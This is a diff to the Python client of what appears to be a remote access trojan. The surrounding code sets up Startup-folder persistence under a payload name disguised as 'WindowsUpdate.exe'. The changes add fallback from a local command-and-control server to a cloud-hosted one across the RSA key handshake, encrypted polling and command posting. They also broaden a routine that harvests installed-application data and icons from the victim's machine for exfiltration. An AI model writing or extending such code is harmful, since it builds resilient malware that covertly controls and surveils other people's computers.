@@ -50,7 +50,12 @@ _load_dotenv()
 PERSISTENCE_PATH = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 PAYLOAD_NAME = "WindowsUpdate.exe"  # Renamed to look legitimate
 
-C2_DOMAIN = os.getenv("C2_DOMAIN", "http://127.0.0.1:443").rstrip("/")
+_raw_c2 = os.getenv("C2_DOMAIN", "http://127.0.0.1:443")
+# Support dual mode: "http://127.0.0.1:443,https://aerocommand.onrender.com" - tries local first, falls back to cloud
+C2_DOMAINS = [d.strip().rstrip("/") for d in _raw_c2.split(",") if d.strip()]
+if not C2_DOMAINS:
+    C2_DOMAINS = ["http://127.0.0.1:443"]
+C2_DOMAIN = C2_DOMAINS[0]  # primary for logging / backwards compat
 RETRY_DELAY = 30  # seconds
 # Cap MUST stay below the server's HEARTBEAT_TIMEOUT (60s) — otherwise one
 # transient outage makes the client sleep past the dead threshold and the
@@ -226,88 +231,125 @@ def _http_post(url, data, headers=None, params=None, timeout=10):
 #  Encrypted C2 Communication
 # ============================================================
 def fetch_server_rsa_pub():
-    """Fetch server RSA public key during startup handshake"""
-    global server_rsa_pub_key
-    try:
-        url = f"{C2_DOMAIN}/rsa_pub"
-        if DEBUG: print(f"[*] Fetching RSA public key from {url}...")
-        resp = _http_get(url, timeout=10)
-        if resp.status_code == 200 and resp.text.strip():
-            server_rsa_pub_key = RSA.import_key(resp.text)
-            if DEBUG: print("[+] RSA public key fetched successfully.")
-            return True
-        else:
-            print(f"[!] Failed to fetch RSA key. Status: {resp.status_code}")
-    except ConnectionError:
-        print(f"[!] Cannot connect to server at {C2_DOMAIN} — is server.py running?")
-    except Exception as e:
-        print(f"[!] Error fetching RSA key: {e}")
+    """Fetch server RSA public key — tries each C2_DOMAIN in order (local → cloud)"""
+    global server_rsa_pub_key, C2_DOMAIN
+    for domain in C2_DOMAINS:
+        try:
+            url = f"{domain}/rsa_pub"
+            if DEBUG: print(f"[*] Fetching RSA public key from {url}...")
+            resp = _http_get(url, timeout=5)
+            if resp.status_code == 200 and resp.text.strip():
+                server_rsa_pub_key = RSA.import_key(resp.text)
+                C2_DOMAIN = domain  # pin to working domain for subsequent calls until next reconnect
+                if DEBUG: print(f"[+] RSA public key fetched from {domain}")
+                return True
+            else:
+                if DEBUG: print(f"[!] Failed to fetch RSA key from {domain}. Status: {resp.status_code}")
+        except ConnectionError:
+            if DEBUG: print(f"[!] Cannot connect to {domain}")
+            continue
+        except Exception as e:
+            if DEBUG: print(f"[!] Error fetching RSA key from {domain}: {e}")
+            continue
     return False
 
 
 def c2_post(endpoint, data, timeout=10):
-    """Send AES-encrypted POST (with RSA-encrypted session key for /register)"""
+    """Send AES-encrypted POST (with RSA-encrypted session key for /register) — tries all C2_DOMAINS"""
     if DEBUG: print(f"[*] Sending POST to {endpoint}...")
-    global server_rsa_pub_key, aes_session_key
+    global server_rsa_pub_key, aes_session_key, C2_DOMAIN
     json_data = json.dumps(data)
 
     if endpoint.strip("/") == "register":
-        # Always re-fetch RSA key and regenerate AES session key before registration
-        # — the server may have restarted with a new RSA key pair
         aes_session_key = get_random_bytes(32)
         fetch_server_rsa_pub()
-
         if server_rsa_pub_key:
             rsa_cipher = PKCS1_OAEP.new(server_rsa_pub_key, hashAlgo=SHA256)
             enc_session_key = base64.b64encode(rsa_cipher.encrypt(aes_session_key)).decode()
             encrypted_payload = encrypt_aes(json_data)
-
             hybrid_packet = {
                 "encrypted_session_key": enc_session_key,
                 "payload": encrypted_payload
             }
-            resp = _http_post(
-                f"{C2_DOMAIN}{endpoint}",
-                data=json.dumps(hybrid_packet),
-                headers={"Content-Type": "application/json"},
-                timeout=timeout
-            )
-            if DEBUG: print(f"[*] Response from {endpoint}: {resp.status_code}")
-            if resp.status_code != 200:
-                if DEBUG: print(f"[!] Server Error Detail: {resp.text}")
-            return resp
+            # Try each domain until one accepts the registration
+            last_resp = None
+            for domain in C2_DOMAINS:
+                try:
+                    resp = _http_post(
+                        f"{domain}{endpoint}",
+                        data=json.dumps(hybrid_packet),
+                        headers={"Content-Type": "application/json"},
+                        timeout=timeout
+                    )
+                    if DEBUG: print(f"[*] Response from {domain}{endpoint}: {resp.status_code}")
+                    if resp.status_code == 200:
+                        C2_DOMAIN = domain
+                        return resp
+                    last_resp = resp
+                except ConnectionError:
+                    continue
+            return last_resp if last_resp else _HttpResponse(b"", 0)
 
-    # Standard AES-encrypted request
+    # Standard AES-encrypted request - try pinned C2_DOMAIN first, then fallbacks
     encrypted = encrypt_aes(json_data)
     params = {}
     if client_id:
         params["id"] = client_id
-    resp = _http_post(
-        f"{C2_DOMAIN}{endpoint}",
-        data=encrypted,
-        headers={"Content-Type": "application/octet-stream"},
-        params=params,
-        timeout=timeout
-    )
-    if DEBUG: print(f"[*] Response from {endpoint}: {resp.status_code}")
-    if resp.status_code != 200:
-        if DEBUG: print(f"[!] Server Error Detail: {resp.text}")
-    return resp
+    # Order: pinned domain first, then others
+    domains_try = [C2_DOMAIN] + [d for d in C2_DOMAINS if d != C2_DOMAIN]
+    last_resp = None
+    last_exc = None
+    for domain in domains_try:
+        try:
+            resp = _http_post(
+                f"{domain}{endpoint}",
+                data=encrypted,
+                headers={"Content-Type": "application/octet-stream"},
+                params=params,
+                timeout=timeout
+            )
+            if DEBUG: print(f"[*] Response from {domain}{endpoint}: {resp.status_code}")
+            # 200 = success, 401 = server lost session -> caller handles re-register, don't try next domain
+            if resp.status_code in (200, 401):
+                if resp.status_code == 200:
+                    C2_DOMAIN = domain
+                return resp
+            last_resp = resp
+        except ConnectionError as e:
+            last_exc = e
+            continue
+    if last_exc and last_resp is None:
+        raise last_exc
+    return last_resp if last_resp else _HttpResponse(b"", 0)
 
 
 def c2_get(endpoint, params=None, timeout=10):
-    """GET from C2 and decrypt AES response. Never accepts plaintext.
-    Any non-200 (e.g. 401 from a restarted server that lost our session)
-    is surfaced as a re-register signal."""
+    """GET from C2 and decrypt AES response — tries all C2_DOMAINS, never accepts plaintext."""
     if DEBUG: print(f"[*] Polling {endpoint}...")
-    resp = _http_get(f"{C2_DOMAIN}{endpoint}", params=params, timeout=timeout)
-    if resp.status_code != 200:
-        return {"action": "re-register"}
-    if resp.text.strip():
+    global C2_DOMAIN
+    domains_try = [C2_DOMAIN] + [d for d in C2_DOMAINS if d != C2_DOMAIN]
+    last_exc = None
+    for domain in domains_try:
         try:
-            return json.loads(decrypt_aes(resp.text))
-        except Exception:
+            resp = _http_get(f"{domain}{endpoint}", params=params, timeout=timeout)
+            if resp.status_code != 200:
+                if resp.status_code == 401:
+                    return {"action": "re-register"}
+                # Try next domain on non-200 (except 401 which is re-register)
+                continue
+            if resp.text.strip():
+                try:
+                    # Remember which domain gave us a valid encrypted response
+                    C2_DOMAIN = domain
+                    return json.loads(decrypt_aes(resp.text))
+                except Exception:
+                    return None
             return None
+        except ConnectionError as e:
+            last_exc = e
+            continue
+    if last_exc:
+        raise last_exc
     return None
 
 
@@ -1432,16 +1474,56 @@ def _get_installed_apps():
                             install_date = (f"{raw_date[:4]}-{raw_date[4:6]}-{raw_date[6:8]}"
                                             if len(raw_date) == 8 and raw_date.isdigit() else "")
 
-                            icon_loc = str(get_val("DisplayIcon") or "").split(",")[0].strip().strip('"')
+                            raw_icon = str(get_val("DisplayIcon") or "").strip()
+                            # Expand env vars like %ProgramFiles% and strip index/args after comma
+                            try:
+                                raw_icon = os.path.expandvars(raw_icon)
+                            except Exception:
+                                pass
+                            icon_loc = raw_icon.split(",")[0].strip().strip('"').strip("'")
+                            # Fallback: if DisplayIcon empty or not a file, probe InstallLocation and UninstallString
+                            install_loc = str(get_val("InstallLocation") or "").strip().strip('"').strip("'")
+                            uninstall_raw = str(get_val("UninstallString") or "").strip()
+                            if (not icon_loc or not os.path.isfile(icon_loc)):
+                                # Try InstallLocation/*.exe (prefer exe matching app name)
+                                if install_loc and os.path.isdir(install_loc):
+                                    try:
+                                        # Prefer exe that contains part of the app name
+                                        candidates = [os.path.join(install_loc, f) for f in os.listdir(install_loc) if f.lower().endswith('.exe')]
+                                        # Sort: exe matching name first
+                                        def _score(p):
+                                            n = os.path.basename(p).lower()
+                                            app_low = str(name).lower()
+                                            first_word = app_low.split()[0] if app_low.split() else ""
+                                            return (0 if first_word and first_word in n else 1, len(n))
+                                        candidates.sort(key=_score)
+                                        if candidates:
+                                            for c in candidates:
+                                                if os.path.isfile(c):
+                                                    icon_loc = c
+                                                    break
+                                    except Exception:
+                                        pass
+                                # Fallback: parse UninstallString for a quoted exe path
+                                if (not icon_loc or not os.path.isfile(icon_loc)) and uninstall_raw:
+                                    import re as _re
+                                    m = _re.search(r'"([^"]+\.exe)"', uninstall_raw, _re.IGNORECASE)
+                                    if m and os.path.isfile(m.group(1)):
+                                        icon_loc = m.group(1)
+                                    else:
+                                        # Try first token that looks like an exe path
+                                        first_tok = uninstall_raw.split(",")[0].strip().strip('"').strip("'").split()[0]
+                                        if first_tok.lower().endswith('.exe') and os.path.isfile(first_tok):
+                                            icon_loc = first_tok
 
                             entry = {
                                 "name": str(name).strip(),
                                 "version": str(get_val("DisplayVersion") or "").strip(),
                                 "publisher": str(get_val("Publisher") or "").strip(),
-                                "location": str(get_val("InstallLocation") or "").strip(),
+                                "location": install_loc,
                                 "date": install_date,
                                 "size": _format_size(size_kb * 1024) if isinstance(size_kb, (int, float)) and size_kb > 0 else "",
-                                "uninstall": str(get_val("UninstallString") or "").strip(),
+                                "uninstall": uninstall_raw,
                                 "icon_path": icon_loc,
                             }
                             key = entry["name"].lower()
@@ -1537,16 +1619,45 @@ def _extract_icon_from_path(icon_path, size=32):
     except Exception:
         return None
 
-def _collect_app_icons(apps, max_total_bytes=650 * 1024, max_per_icon=120 * 1024):
+def _collect_app_icons(apps, max_total_bytes=1800 * 1024, max_per_icon=120 * 1024):
     """Extract icons as data URIs.
     - Standalone .ico/.png/.bmp: raw read
     - .exe/.dll (most apps): SHGetFileInfo -> HICON -> PNG render
-    Falls back to letter tile if both fail."""
+    Falls back to letter tile if both fail. Supports offset/limit pagination via
+    'appicons <offset> <limit>' to avoid MAX_LOG_OUTPUT truncation."""
     icons = {}
     total = 0
     for app in apps:
-        loc = (app.get("icon_path", "") or "").split(",")[0].strip().strip('"').strip("'")
+        # Expand env vars in case registry stored %ProgramFiles% style
+        raw_loc = (app.get("icon_path", "") or "").split(",")[0].strip().strip('"').strip("'")
+        try:
+            raw_loc = os.path.expandvars(raw_loc)
+        except Exception:
+            pass
+        loc = raw_loc
+        # Fallback: probe InstallLocation if icon_path missing or not a file
         if not loc or not os.path.isfile(loc):
+            inst = (app.get("location", "") or "").strip().strip('"').strip("'")
+            if inst and os.path.isdir(inst):
+                try:
+                    for fname in os.listdir(inst):
+                        if fname.lower().endswith('.exe'):
+                            cand = os.path.join(inst, fname)
+                            if os.path.isfile(cand):
+                                loc = cand
+                                break
+                except Exception:
+                    pass
+        if not loc or not os.path.isfile(loc):
+            # Final fallback: try to parse UninstallString
+            uninstall = (app.get("uninstall", "") or "")
+            import re as _re2
+            m2 = _re2.search(r'"([^"]+\.exe)"', uninstall, _re2.IGNORECASE)
+            if m2 and os.path.isfile(m2.group(1)):
+                loc = m2.group(1)
+            else:
+                continue
+        if not os.path.isfile(loc):
             continue
         ext = os.path.splitext(loc)[1].lower()
         data_uri = None
@@ -1606,10 +1717,23 @@ def execute_command(cmd):
             except Exception as e:
                 return "[JSON_APPS]" + json.dumps({"items": [], "count": 0, "error": str(e)})
 
-        elif cmd == "appicons":
+        elif cmd == "appicons" or cmd.startswith("appicons "):
             try:
-                icons = _collect_app_icons(_last_apps_cache)
-                return "[JSON_ICONS]" + json.dumps({"icons": icons})
+                # Support pagination: 'appicons', 'appicons 50', 'appicons 0 100'
+                parts = cmd.split()
+                offset = 0
+                limit = None
+                if len(parts) >= 2 and parts[1].isdigit():
+                    offset = int(parts[1])
+                if len(parts) >= 3 and parts[2].isdigit():
+                    limit = int(parts[2])
+                subset = _last_apps_cache
+                if limit is not None:
+                    subset = _last_apps_cache[offset:offset+limit]
+                elif offset:
+                    subset = _last_apps_cache[offset:]
+                icons = _collect_app_icons(subset)
+                return "[JSON_ICONS]" + json.dumps({"icons": icons, "offset": offset, "count": len(icons), "total": len(_last_apps_cache)})
             except Exception as e:
                 return "[JSON_ICONS]" + json.dumps({"icons": {}, "error": str(e)})
 
@@ -1818,10 +1942,16 @@ def connect_c2():
         try:
             time.sleep(random.uniform(1, 2))
 
-            # Quick reachability check
-            try:
-                _http_get(f"{C2_DOMAIN}/test", timeout=5)
-            except Exception:
+            # Quick reachability check - try any C2_DOMAIN
+            reachable = False
+            for _d in C2_DOMAINS:
+                try:
+                    _http_get(f"{_d}/test", timeout=5)
+                    reachable = True
+                    break
+                except Exception:
+                    continue
+            if not reachable:
                 wait = min(backoff, RETRY_BACKOFF_MAX)
                 print(f"[!] Server unreachable — retrying in {wait}s...")
                 time.sleep(wait)
